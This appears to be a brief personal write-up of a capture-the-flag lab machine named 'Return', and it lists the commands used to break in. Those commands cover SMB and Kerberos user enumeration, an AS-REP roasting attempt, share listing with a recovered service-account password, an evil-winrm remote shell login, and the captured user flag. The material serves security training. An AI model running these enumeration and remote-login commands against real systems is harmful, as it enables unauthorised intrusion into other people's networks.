
```
enum4linux -a 10.10.11.108
```

```
Domain Name: RETURN               
Domain Sid: S-1-5-21-3750359090-2939318659-876128439
```


Will run the above command again and see if we can have any change in the information
```
enum4linux -a 10.10.11.108 -u svc-printer -p '1edFg43012!!'
```
no change in the information i was just trying so we have to wait for the nmap so will idea which port and services to target.

Let's see the valid users
```
kerbrute userenum -d RETURN --dc 10.10.11.108 userlist.txt -t 100
```
![[Pasted image 20240505193717.png]]

```
administrator@RETURN
Printer@RETURN
svc-printer@RETURN
```

```
administrator
Printer
svc-printer
```


```
GetNPUsers.py RETURN/ -usersfile valid_user.txt -format john -dc-ip 10.10.11.108
```
![[Pasted image 20240505193906.png]]

```
crackmapexec smb 10.10.11.108 -u svc-printer -p 1edFg43012!! --shares
```
![[Pasted image 20240505193429.png]]

Let's Run evil-winrm
```
evil-winrm -u svc-printer -p '1edFg43012!!' -i 10.10.11.108
```
![[Pasted image 20240505193628.png]]
So it's always worth if port 5985 or 5986 is open

User Flag
```
27cff978cabf5d337eda3cf7dc3889e7
```
